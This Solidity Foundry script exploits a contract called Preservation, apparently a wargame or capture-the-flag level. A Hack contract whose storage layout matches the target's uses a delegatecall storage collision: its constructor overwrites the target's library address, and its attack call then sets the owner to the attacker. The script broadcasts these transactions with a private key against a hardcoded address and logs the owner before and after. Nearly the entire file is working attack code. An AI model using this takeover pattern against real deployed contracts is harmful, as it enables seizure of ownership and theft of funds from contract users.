// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";

contract Hack {
    uint256 slot1;
    uint256 slot2;
    uint256 slot3;

    Preservation preservation;
    constructor(address _preservation) {
        preservation = Preservation(_preservation);
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function attack() external {
        preservation.setFirstTime(
            uint256(uint160(msg.sender))
        );
    }

    function setTime(uint256 _time) public {
        slot3 = _time;
    }
}

contract PreservationHack is Script {
    Hack hack;
    Preservation public preservation =
        Preservation(0x44eDe8C26521151dB72262f6Cd14E883e118F4a8);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(preservation.owner());

        hack = new Hack(address(preservation));
        hack.attack();

        console.log(preservation.owner());

        vm.stopBroadcast();
    }
}

// forge script script/Preservation.s.sol -vv --tc PreservationHack
// forge script script/Preservation.s.sol -vv --tc PreservationHack --broadcast
